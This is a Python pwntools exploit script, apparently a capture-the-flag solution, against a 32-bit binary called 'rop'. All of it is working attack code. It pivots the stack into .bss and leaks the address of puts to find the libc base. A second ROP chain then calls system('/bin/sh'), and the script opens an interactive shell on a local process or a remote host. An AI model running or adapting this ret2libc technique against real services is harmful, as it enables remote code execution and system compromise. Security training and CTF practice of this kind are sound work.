#!/usr/bin/python
#coding=utf-8
#__author__:TaQini

from pwn import *

local_file  = './rop'
local_libc  = '/lib/i386-linux-gnu/libc.so.6'
remote_libc = './libc.so.6'

is_local = False
is_remote = False

if len(sys.argv) == 1:
    is_local = True
    p = process(local_file)
    libc = ELF(local_libc)
elif len(sys.argv) > 1:
    is_remote = True
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    else:
        host, port = sys.argv[1].split(':')
    p = remote(host, port)
    libc = ELF(remote_libc)

elf = ELF(local_file)

context.log_level = 'debug'
context.arch = elf.arch

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))

def debug(cmd=''):
    if is_local: gdb.attach(p,cmd)

# info
# gadget
pr = 0x0804901e # pop ebx ; ret
ppr = 0x080492df # pop ebx ; pop ebp ; ret
leave = 0x8049712 # leave ; ret

ebp = elf.bss()+0x200
# stack pivot
payload = cyclic(12)
payload+= p32(ebp)          # ebp
payload+= p32(0x080496d1)   # return address
payload+= p32(0xdeadbeef)   # padding

ru('So where we roppin boys?\n')
se(payload)

# rop1
ropchain = p32(elf.sym['puts'])+p32(elf.sym['main'])+p32(elf.got['puts'])
pl2 = ropchain
pl2+= p32(ebp-0xc-4)  # ebp
pl2+= p32(leave)      # return address
pl2+= p32(0xdeadbeef) # padding
debug()
se(pl2)

puts = uu32(rc(4))
info_addr('puts',puts)
libcbase = puts-libc.sym['puts']
info_addr('libcbase',libcbase)
system = libcbase+libc.sym['system']
info_addr('system',system)
binsh = libcbase+libc.search('/bin/sh').next()
info_addr('binsh',binsh)

# debug('b *0x80496ee')

ru('So where we roppin boys?\n')

# stack pivot 
ebp = elf.bss()+0x800
pl3 = cyclic(12)
pl3+= p32(ebp)          # ebp
pl3+= p32(0x080496d1)   # return address
pl3+= p32(0xdeadbeef)   # padding
se(pl3)

# rop2
ropchain = p32(system)+p32(elf.sym['main'])+p32(binsh)
pl4 = ropchain
pl4+= p32(ebp-0xc-4)  # ebp
pl4+= p32(leave)      # return address
pl4+= p32(0xdeadbeef) # padding
se(pl4)

p.interactive()

